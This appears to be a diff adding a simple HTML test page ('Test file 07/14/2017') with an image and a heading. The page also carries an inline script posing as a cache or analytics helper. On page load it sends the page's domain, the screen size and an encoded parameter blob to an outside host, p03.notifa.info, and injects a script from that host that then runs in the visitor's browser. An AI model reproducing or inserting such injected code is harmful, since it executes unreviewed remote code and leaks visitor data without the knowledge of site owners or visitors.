@@ -1,0 +1,8 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mApz5Y5dADL8%2fEAhpLYPO2I25%2fojggzJ%2fI8%2frD%2fYGmC4GYjtI61SKxrOmLJYq0Ae3lZ2OM6NudLNz2Op2j8wjP2g6asSuRG%2bmqj6h5ST2EvhzOTa5mUS90b4Di6nbBNxO0QzIiYDSGOLtMmDgZO3VzCDo5yHcRKGsa75ARkmqgnMHF8LJFLyusNUuwLYA%2byrUhnx%2blzvNILHq5g%2bKmayOtdj81MfZYyBhAI27DT0Eo%2fGIS8sL6I3m0T66mVe4Kydfy8jancHtQeVBEYXp8SDrZmJYeTi0Vch3PSW%2bNq9AkiGob0lUHsDd3G16nfJ2dgsSqy8v1ZMN5nvRoPzFJwrKBmxwyKdNMhwuwwXX%2f3fKZYeMSBvRyTaESanWb6DTLj594UUkYhaImWSCULBCngvlWlTiuxoaaB7K0ffE8J3GQFoPYYykWt5%2bqnyNQEfRQs%2bo3AlIOp46HuURmhm%2fJ7QVlP3YIAV7DTbT3hQGQ9nu6%2bYXE%2bH6e9QdvqqcxYy3BmSvh%2biJHGR%2bILgKPzXRBVEgPfh41RH93twUgnzMgGkod6%2f8KuMPYeyFwigSR7NEIod6gAUIFR22Bko%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
